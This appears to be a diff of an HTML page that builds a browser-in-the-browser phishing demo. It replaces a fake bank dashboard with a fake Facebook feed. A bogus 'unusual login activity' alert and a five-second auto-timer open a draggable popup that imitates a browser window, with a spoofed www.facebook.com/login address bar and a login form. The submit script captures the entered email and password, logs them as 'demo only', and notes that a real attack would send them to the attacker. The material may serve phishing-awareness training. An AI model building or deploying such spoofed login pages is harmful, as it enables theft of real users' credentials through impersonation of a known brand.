+            <div class="icon-btn">
+                <svg viewBox="0 0 28 28" fill="currentColor" height="20" width="20">
+                    <path d="M7.847 23.488C9.207 23.488 11.443 23.363 14.467 22.806 13.944 24.228 12.581 25.247 10.98 25.247 9.649 25.247 8.483 24.542 7.825 23.488L7.847 23.488ZM24.923 15.73C25.17 17.002 24.278 18.127 22.27 19.076 21.17 19.595 18.724 20.583 14.684 21.369 11.568 21.974 9.285 22.113 7.848 22.113 7.421 22.113 7.068 22.101 6.79 22.085 4.574 21.958 3.324 21.248 3.077 19.976 2.702 18.049 3.295 17.305 4.278 16.073L4.537 15.748C5.2 14.907 5.459 14.081 5.035 11.902 4.086 7.022 6.284 3.687 11.064 2.753 15.846 1.83 19.134 4.096 20.083 8.977 20.506 11.156 21.056 11.824 21.986 12.355L21.986 12.356 22.348 12.561C23.72 13.335 24.548 13.802 24.923 15.73Z"></path>
+                </svg>
+            </div>
+            <div class="icon-btn">
+                <div class="user-avatar" style="background-image: url('https://source.unsplash.com/100x100/?man,portrait'); background-size: cover;"></div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Left Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-item">
+                <div class="sidebar-icon">J</div>
+                <span>John Doe</span>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">👨‍👩‍👧‍👦</div>
+                <span>Friends</span>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">👥</div>
+                <span>Groups</span>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">🏪</div>
+                <span>Marketplace</span>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">📺</div>
+                <span>Watch</span>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">⏱️</div>
+                <span>Memories</span>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">🔖</div>
+                <span>Saved</span>
+            </div>
+            <div class="sidebar-item">
+                <div class="sidebar-icon">⬇️</div>
+                <span>See More</span>
+            </div>
+        </div>
+
+        <!-- Feed -->
+        <div class="feed">
+            <!-- Security Alert -->
+            <div class="security-alert">
+                <div class="alert-header">
+                    <div class="alert-icon">🔒</div>
+                    <div>
+                        <div class="alert-title">Security Alert: Account Verification Required</div>
+                        <div class="alert-subtitle">Action needed to protect your account</div>
+                    </div>
+                </div>
+                <div class="alert-content">
+                    We've detected unusual login activity on your account from a new location. For your security, please verify your identity to ensure your account remains protected.
+                </div>
+                <div class="alert-actions">
+                    <button class="btn-primary" id="verify-now-btn" onclick="showFacebookPopup()">Verify Now</button>
+                    <button class="btn-secondary">Remind Me Later</button>
+                </div>
+            </div>
+
+            <!-- Stories -->
+            <div class="stories">
+                <div class="story">
+                    <div class="story-bg" style="background-image: url('https://source.unsplash.com/300x400/?profile'); background-size: cover;"></div>
+                    <div class="story-avatar">+</div>
+                    <div style="position: absolute; bottom: 0; left: 0; right: 0; height: 60px; background-color: white; padding: 10px; text-align: center; font-size: 14px; font-weight: 600;">
+                        Create Story
+                    </div>
+                </div>
+                <div class="story">
+                    <div class="story-bg" style="background-image: url('https://source.unsplash.com/300x400/?beach'); background-size: cover;"></div>
+                    <div class="story-avatar">S</div>
+                    <div style="position: absolute; bottom: 10px; left: 10px; color: white; font-weight: 600; font-size: 13px;">Sarah</div>
+                </div>
+                <div class="story">
+                    <div class="story-bg" style="background-image: url('https://source.unsplash.com/300x400/?mountain'); background-size: cover;"></div>
+                    <div class="story-avatar">M</div>
+                    <div style="position: absolute; bottom: 10px; left: 10px; color: white; font-weight: 600; font-size: 13px;">Mike</div>
+                </div>
+                <div class="story">
+                    <div class="story-bg" style="background-image: url('https://source.unsplash.com/300x400/?travel'); background-size: cover;"></div>
+                    <div class="story-avatar">A</div>
+                    <div style="position: absolute; bottom: 10px; left: 10px; color: white; font-weight: 600; font-size: 13px;">Amy</div>
+                </div>
+                <div class="story">
+                    <div class="story-bg" style="background-image: url('https://source.unsplash.com/300x400/?city'); background-size: cover;"></div>
+                    <div class="story-avatar">D</div>
+                    <div style="position: absolute; bottom: 10px; left: 10px; color: white; font-weight: 600; font-size: 13px;">David</div>
+                </div>
+            </div>
+
+            <!-- Create Post -->
+            <div class="create-post">
+                <div class="create-post-input">
                     <div class="user-avatar">J</div>
-                    <span>John Doe</span>
+                    <input type="text" class="post-input" placeholder="What's on your mind, John?">
                 </div>
-            </div>
-        </header>
-
-        <main>
-            <div class="sidebar">
-                <div class="nav-item active">
-                    <span class="nav-icon">🏠</span>
-                    <span class="nav-text">Dashboard</span>
-                </div>
-                <div class="nav-item">
-                    <span class="nav-icon">💳</span>
-                    <span class="nav-text">Accounts</span>
-                </div>
-                <div class="nav-item">
-                    <span class="nav-icon">🔄</span>
-                    <span class="nav-text">Transfers</span>
-                </div>
-                <div class="nav-item">
-                    <span class="nav-icon">📊</span>
-                    <span class="nav-text">Analytics</span>
-                </div>
-                <div class="nav-item">
-                    <span class="nav-icon">💸</span>
-                    <span class="nav-text">Bill Pay</span>
-                </div>
-                <div class="nav-item">
-                    <span class="nav-icon">⚙️</span>
-                    <span class="nav-text">Settings</span>
-                </div>
-                <div class="nav-item" style="margin-top: 30px;">
-                    <span class="nav-icon">🔒</span>
-                    <span class="nav-text">Security Center</span>
-                </div>
-                <div class="nav-item">
-                    <span class="nav-icon">❓</span>
-                    <span class="nav-text">Help & Support</span>
-                </div>
-            </div>
-
-            <div class="dashboard">
-                <div class="dashboard-header">
-                    <div>
-                        <h1 class="greeting">Good afternoon, John</h1>
-                        <div class="date">Thursday, March 20, 2025</div>
+                <div class="post-actions">
+                    <div class="post-action">
+                        🎥
+                        <span>Live Video</span>
                     </div>
-                    <div class="action-buttons">
-                        <button class="action-button secondary-button">
-                            <span>↓</span>
-                            <span>Download Statement</span>
-                        </button>
-                        <button class="action-button primary-button" onclick="showVerificationPopup()">
-                            <span>🔄</span>
-                            <span>Make a Transfer</span>
-                        </button>
+                    <div class="post-action">
+                        📷
+                        <span>Photo/Video</span>
                     </div>
-                </div>
-
-                <div class="dashboard-content">
-                    <div>
-                        <div class="accounts-section">
-                            <div class="section-header">
-                                <h2 class="section-title">Your Accounts</h2>
-                                <span class="section-action">View All</span>
-                            </div>
-                            <div class="account-cards">
-                                <div class="account-card">
-                                    <div class="account-info">
-                                        <div class="account-name">Checking Account</div>
-                                        <div class="account-number">••••4567</div>
-                                    </div>
-                                    <div class="account-balance">$5,842.23</div>
-                                    <div class="account-details">
-                                        <span>Available Balance</span>
-                                        <span>Primary Account</span>
-                                    </div>
-                                </div>
-                                <div class="account-card">
-                                    <div class="account-info">
-                                        <div class="account-name">Savings Account</div>
-                                        <div class="account-number">••••8912</div>
-                                    </div>
-                                    <div class="account-balance">$12,385.91</div>
-                                    <div class="account-details">
-                                        <span>Interest Rate: 0.75%</span>
-                                        <span>Last Transaction: 5 days ago</span>
-                                    </div>
-                                </div>
-                                <div class="account-card">
-                                    <div class="account-info">
-                                        <div class="account-name">Premium Credit Card</div>
-                                        <div class="account-number">••••3456</div>
-                                    </div>
-                                    <div class="account-balance">$1,247.65</div>
-                                    <div class="account-details">
-                                        <span>Current Balance</span>
-                                        <span>Due Date: April 15, 2025</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="accounts-section" style="margin-top: 25px;">
-                            <div class="section-header">
-                                <h2 class="section-title">Recent Transactions</h2>
-                                <span class="section-action">View All</span>
-                            </div>
-                            <div class="transaction-list">
-                                <div class="transaction-item">
-                                    <div class="transaction-icon expense">↑</div>
-                                    <div class="transaction-details">
-                                        <div class="transaction-title">Amazon.com</div>
-                                        <div class="transaction-date">Today, 10:23 AM</div>
-                                    </div>
-                                    <div class="transaction-amount expense">-$94.35</div>
-                                </div>
-                                <div class="transaction-item">
-                                    <div class="transaction-icon expense">↑</div>
-                                    <div class="transaction-details">
-                                        <div class="transaction-title">Starbucks Coffee</div>
-                                        <div class="transaction-date">Yesterday, 8:15 AM</div>
-                                    </div>
-                                    <div class="transaction-amount expense">-$6.45</div>
-                                </div>
-                                <div class="transaction-item">
-                                    <div class="transaction-icon income">↓</div>
-                                    <div class="transaction-details">
-                                        <div class="transaction-title">Direct Deposit - ACME Inc</div>
-                                        <div class="transaction-date">Mar 15, 2025</div>
-                                    </div>
-                                    <div class="transaction-amount income">+$3,254.89</div>
-                                </div>
-                                <div class="transaction-item">
-                                    <div class="transaction-icon expense">↑</div>
-                                    <div class="transaction-details">
-                                        <div class="transaction-title">Electricity Bill</div>
-                                        <div class="transaction-date">Mar 14, 2025</div>
-                                    </div>
-                                    <div class="transaction-amount expense">-$142.78</div>
-                                </div>
-                                <div class="transaction-item">
-                                    <div class="transaction-icon expense">↑</div>
-                                    <div class="transaction-details">
-                                        <div class="transaction-title">Whole Foods Market</div>
-                                        <div class="transaction-date">Mar 12, 2025</div>
-                                    </div>
-                                    <div class="transaction-amount expense">-$87.23</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div>
-                        <div class="activity-section">
-                            <div class="section-header">
-                                <h2 class="section-title">Recent Activity</h2>
-                                <span class="section-action">View All</span>
-                            </div>
-                            <div class="activity-list">
-                                <div class="activity-item">
-                                    <div class="activity-icon">🔔</div>
-                                    <div class="activity-content">
-                                        <div class="activity-text">Your <strong>March statement</strong> is now available</div>
-                                        <div class="activity-time">Today, 9:45 AM</div>
-                                    </div>
-                                </div>
-                                <div class="activity-item">
-                                    <div class="activity-icon">💳</div>
-                                    <div class="activity-content">
-                                        <div class="activity-text">Unusual activity detected on your <strong>Premium Credit Card</strong></div>
-                                        <div class="activity-time">Yesterday</div>
-                                    </div>
-                                </div>
-                                <div class="activity-item">
-                                    <div class="activity-icon">📱</div>
-                                    <div class="activity-content">
-                                        <div class="activity-text">A new device was used to sign in to your account</div>
-                                        <div class="activity-time">Mar 18, 2025</div>
-                                    </div>
-                                </div>
-                                <div class="activity-item">
-                                    <div class="activity-icon">🔄</div>
-                                    <div class="activity-content">
-                                        <div class="activity-text">Scheduled transfer to <strong>Savings</strong> completed</div>
-                                        <div class="activity-time">Mar 15, 2025</div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="security-alert">
-                            <div class="alert-heading">
-                                <span class="alert-icon">⚠️</span>
-                                <span>Security Alert</span>
-                            </div>
-                            <div class="alert-text">
-                                We've noticed some suspicious login attempts on your account. Please verify your identity and review recent activity.
-                            </div>
-                            <div class="alert-action" onclick="showVerificationPopup()">
-                                Verify Now
-                            </div>
-                        </div>
+                    <div class="post-action">
+                        😊
+                        <span>Feeling/Activity</span>
                     </div>
                 </div>
             </div>
-        </main>
+
+            <!-- Post 1 -->
+            <div class="post">
+                <div class="post-header">
+                    <div class="user-avatar" style="background-image: url('https://source.unsplash.com/100x100/?woman,profile'); background-size: cover;"></div>
+                    <div class="post-user">
+                        <div class="post-username">Sarah Johnson</div>
+                        <div class="post-time">2 hrs · 🌎</div>
+                    </div>
+                    <div class="post-menu">⋯</div>
+                </div>
+                <div class="post-content">
+                    Beautiful day at the beach! 🏖️ #SummerVibes
+                </div>
+                <div class="post-image" style="background-image: url('https://source.unsplash.com/800x600/?beach,summer'); background-size: cover; background-position: center;"></div>
+                <div class="post-stats">
+                    <div>
+                        <span>👍❤️</span> 256
+                    </div>
+                    <div>42 comments · 5 shares</div>
+                </div>
+                <div class="post-interactions">
+                    <div class="interaction">
+                        👍
+                        <span>Like</span>
+                    </div>
+                    <div class="interaction">
+                        💬
+                        <span>Comment</span>
+                    </div>
+                    <div class="interaction">
+                        ↗️
+                        <span>Share</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Post 2 -->
+            <div class="post">
+                <div class="post-header">
+                    <div class="user-avatar" style="background-image: url('https://source.unsplash.com/100x100/?tech,group'); background-size: cover;"></div>
+                    <div class="post-user">
+                        <div class="post-username">TechNews Group</div>
+                        <div class="post-time">5 hrs · 🌎</div>
+                    </div>
+                    <div class="post-menu">⋯</div>
+                </div>
+                <div class="post-content">
+                    The latest smartphone is here! Check out the new features and improvements that make this the best model yet. #TechNews #NewRelease
+                </div>
+                <div class="post-image" style="background-image: url('https://source.unsplash.com/800x600/?smartphone,technology'); background-size: cover; background-position: center;"></div>
+                <div class="post-stats">
+                    <div>
+                        <span>👍❤️😮</span> 1.2K
+                    </div>
+                    <div>187 comments · 92 shares</div>
+                </div>
+                <div class="post-interactions">
+                    <div class="interaction">
+                        👍
+                        <span>Like</span>
+                    </div>
+                    <div class="interaction">
+                        💬
+                        <span>Comment</span>
+                    </div>
+                    <div class="interaction">
+                        ↗️
+                        <span>Share</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Sidebar -->
+        <div class="right-sidebar">
+            <div class="contacts-header">
+                <div class="contacts-title">Contacts</div>
+                <div class="contacts-actions">
+                    <span style="font-size: 16px;">🔍</span>
+                    <span style="font-size: 16px;">⋮</span>
+                </div>
+            </div>
+            <div class="contact">
+                                    <div class="contact-avatar" style="background-image: url('https://source.unsplash.com/100x100/?woman,portrait'); background-size: cover;">
+                        <div class="online-indicator"></div>
+                    </div>
+                <span>Sarah Johnson</span>
+            </div>
+            <div class="contact">
+                                    <div class="contact-avatar" style="background-image: url('https://source.unsplash.com/100x100/?man,portrait'); background-size: cover;">
+                        <div class="online-indicator"></div>
+                    </div>
+                <span>Mike Peterson</span>
+            </div>
+            <div class="contact">
+                                    <div class="contact-avatar" style="background-image: url('https://source.unsplash.com/100x100/?woman,face'); background-size: cover;"></div>
+                <span>Amy Williams</span>
+            </div>
+            <div class="contact">
+                                    <div class="contact-avatar" style="background-image: url('https://source.unsplash.com/100x100/?asian,man'); background-size: cover;">
+                        <div class="online-indicator"></div>
+                    </div>
+                <span>David Chen</span>
+            </div>
+            <div class="contact">
+                                    <div class="contact-avatar" style="background-image: url('https://source.unsplash.com/100x100/?blonde,woman'); background-size: cover;"></div>
+                <span>Emily Taylor</span>
+            </div>
+            <div class="contact">
+                                    <div class="contact-avatar" style="background-image: url('https://source.unsplash.com/100x100/?beard,man'); background-size: cover;"></div>
+                <span>James Wilson</span>
+            </div>
+            <div class="contact">
+                                    <div class="contact-avatar" style="background-image: url('https://source.unsplash.com/100x100/?brunette,woman'); background-size: cover;">
+                        <div class="online-indicator"></div>
+                    </div>
+                <span>Lisa Brown</span>
+            </div>
+        </div>
     </div>
 
     <!-- BITB Overlay -->
     <div id="overlay" class="overlay"></div>
 
-    <!-- BITB Popup -->
+    <!-- Facebook Login BITB Popup -->
     <div id="bitb-popup" class="bitb-popup">
         <div class="bitb-header" id="bitb-header">
-            <div class="bitb-header-text">
-                <span>🔒</span> secure.securebank.com
-            </div>
             <div class="bitb-header-actions">
-                <div class="bitb-action" style="background-color: #ffbd44;"></div>
-                <div class="bitb-action" style="background-color: #00ca4e;" onclick="closeBITB()"></div>
+                <div class="bitb-action" style="background-color: #ff5f57;"></div>
+                <div class="bitb-action" style="background-color: #febc2e;"></div>
+                <div class="bitb-action" style="background-color: #28c840;" onclick="closeBITB()"></div>
+            </div>
+            <div class="bitb-header-text">
+                <span>Log into Facebook</span>
             </div>
         </div>
+        
+        <div class="url-bar">
+            <span class="url-lock">🔒</span>
+            <span>www.facebook.com/login</span>
+        </div>
+        
         <div class="bitb-content">
-            <div class="bitb-logo">
-                <span>🏦</span>
-                <span>SecureBank</span>
-            </div>
-            <h2 class="bitb-title">Verify Your Identity</h2>
-            <div class="bitb-form">
-                <div class="form-group">
-                    <label class="form-label">Username</label>
-                    <input type="text" class="bitb-input" value="johndoe" readonly>
+            <div class="facebook-login">
+                <div class="facebook-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="112" height="112" viewBox="0 0 112 112">
+                        <path d="M56.12.001c31 0 56.12 25.12 56.12 56.12 0 31-25.12 56.12-56.12 56.12-31 0-56.12-25.12-56.12-56.12C0 25.121 25.12.001 56.12.001z" fill="#1877f2" />
+                        <path d="M77.62 71.246l2.028-13.232h-12.686v-8.585c0-3.618 1.772-7.145 7.46-7.145h5.77V30.902a70.383 70.383 0 0 0-10.255-.892c-10.465 0-17.304 6.338-17.304 17.806v10.1H38.35v13.233h14.283v32c2.857.448 5.79.68 8.787.68 2.998 0 5.931-.232 8.788-.68v-32h7.41z" fill="#fff" />
+                    </svg>
                 </div>
-                <div class="form-group">
-                    <label class="form-label">Password</label>
-                    <input type="password" class="bitb-input" placeholder="Enter your password" autocomplete="off">
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Security Code</label>
-                    <input type="text" class="bitb-input" placeholder="Enter the code sent to your phone" autocomplete="off">
-                </div>
-                <button class="bitb-button" onclick="simulateLogin()">Verify</button>
-                
-                <div class="bitb-options">
-                    <span class="bitb-option">Forgot Password?</span>
-                    <span class="bitb-option">Need Help?</span>
-                </div>
-            </div>
-            <div class="bitb-footer">
-                Secured with 256-bit encryption • Privacy Policy
+                <form class="login-form" id="facebook-login-form">
+                    <div class="login-title">Log Into Facebook</div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="email" placeholder="Email or phone number" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" class="form-input" id="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-button">Log In</button>
+                    <div class="forgot-password">
+                        <a href="#">Forgot Password?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account-button">Create New Account</button>
+                </form>
             </div>
         </div>
     </div>
 
-    <!-- Dialog Box -->
+    <!-- Loading Indicator -->
+    <div id="loader-container" class="loader-container">
+        <div class="loader"></div>
+    </div>
+
+    <!-- Success Dialog -->
     <div id="security-dialog" class="dialog">
         <div class="dialog-header">
-            <span style="color: #f57c00; font-size: 20px;">✅</span>
+            <span style="color: #4caf50; font-size: 20px;">✅</span>
             <h3 class="dialog-title">Verification Successful</h3>
         </div>
         <div class="dialog-content">
-            <p>Dear User, </p>
-            <p style="margin-top: 10px;">Your Account has been succesfully verified.</p>
-            <p style="margin-top: 10px;">You may now proceed to the website</p>
+            <p>Your account has been successfully verified.</p>
+            <p style="margin-top: 10px;">You can now continue using Facebook with full access to all features.</p>
         </div>
         <div class="dialog-buttons">
-            <button class="dialog-button" style="background-color: #eeeeee;" onclick="closeDialog()">Close</button>
-            <button class="dialog-button" style="background-color: var(--primary-color); color: white;" onclick="continueToWebsite()">Continue</button>
+            <button class="dialog-button cancel-button" onclick="closeDialog()">Close</button>
+            <button class="dialog-button continue-button" onclick="continueToWebsite()">Continue</button>
         </div>
     </div>
 
     <script>
-        // Show the verification popup (BITB attack simulation)
-        function continueToWebsite(){
-            document.getElementById('security-dialog').style.display = 'none';
-        }
-        function showVerificationPopup() {
+        // Show the Facebook BITB popup
+        function showFacebookPopup() {
             document.getElementById('overlay').style.display = 'block';
             document.getElementById('bitb-popup').style.display = 'block';
             makeDraggable(document.getElementById('bitb-popup'), document.getElementById('bitb-header'));
@@ -939,12 +1210,9 @@
         function closeBITB() {
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('bitb-popup').style.display = 'none';
-            setTimeout(() => {
-                showSecurityDialog();
-            }, 500);
         }
 
-        // Show security dialog
+        // Show success dialog
         function showSecurityDialog() {
             document.getElementById('security-dialog').style.display = 'block';
         }
@@ -954,20 +1222,10 @@
             document.getElementById('security-dialog').style.display = 'none';
         }
 
-        // Simulate login
-        function simulateLogin() {
-            // Display a brief "verifying" message
-            const button = document.querySelector('.bitb-button');
-            const originalText = button.textContent;
-            button.textContent = 'Verifying...';
-            button.disabled = true;
-            
-            // After a short delay, show the security dialog
-            setTimeout(() => {
-                closeBITB();
-                button.textContent = originalText;
-                button.disabled = false;
-            }, 1500);
+        // Continue to website
+        function continueToWebsite() {
+            document.getElementById('security-dialog').style.display = 'none';
+            // In a real attack, this might redirect to the actual Facebook site
         }
 
         // Make the popup draggable
@@ -980,19 +1238,21 @@
                 offsetY = e.clientY - popup.getBoundingClientRect().top;
                 popup.style.transition = 'none';
                 
-                // Remove transform to allow proper positioning
-                popup.style.transform = 'none';
-                
-                // Update initial position
-                popup.style.left = `${popup.getBoundingClientRect().left}px`;
-                popup.style.top = `${popup.getBoundingClientRect().top}px`;
+                // Remove transform for proper positioning
+                if (window.innerWidth > 576) {
+                    popup.style.transform = 'none';
+                    
+                    // Update initial position
+                    popup.style.left = `${popup.getBoundingClientRect().left}px`;
+                    popup.style.top = `${popup.getBoundingClientRect().top}px`;
+                }
                 
                 document.onmousemove = drag;
                 document.onmouseup = stopDrag;
             };
 
             function drag(e) {
-                if (!isDragging) return;
+                if (!isDragging || window.innerWidth <= 576) return;
                 popup.style.left = `${e.clientX - offsetX}px`;
                 popup.style.top = `${e.clientY - offsetY}px`;
             }
@@ -1004,24 +1264,32 @@
             }
         }
 
-        // Initialize - Add some random dates and amounts
-        document.addEventListener('DOMContentLoaded', function() {
-            const dates = document.querySelectorAll('.transaction-date, .activity-time');
+        // Set up form submission
+        document.getElementById('facebook-login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
             
-            // Update displayed date
-            const today = new Date();
-            const options = { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' };
-            document.querySelector('.date').textContent = today.toLocaleDateString('en-US', options);
+            // Get the credentials (for demonstration - in a real attack, these would be sent to the attacker)
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            // Add time-of-day greeting
-            const hours = today.getHours();
-            let greeting = "Good morning";
-            if (hours >= 12 && hours < 17) {
-                greeting = "Good afternoon";
-            } else if (hours >= 17) {
-                greeting = "Good evening";
-            }
-            document.querySelector('.greeting').textContent = `${greeting}, John`;
+            console.log("Captured Facebook credentials (demo only):", {email, password});
+            
+            // Show loading indicator
+            document.getElementById('loader-container').style.display = 'flex';
+            
+            // After a short delay, close the BITB popup and show the success dialog
+            setTimeout(() => {
+                document.getElementById('loader-container').style.display = 'none';
+                closeBITB();
+                showSecurityDialog();
+            }, 1500);
         });
-
-        </script>
+// Auto-trigger the popup after 5 seconds
+setTimeout(function() {
+    showFacebookPopup();
+}, 5000);
+        // Auto-trigger the popup when "Verify Now" is clicked
+        document.getElementById('verify-now-btn').addEventListener('click', showFacebookPopup);
+    </script>
+</body>
+</html>
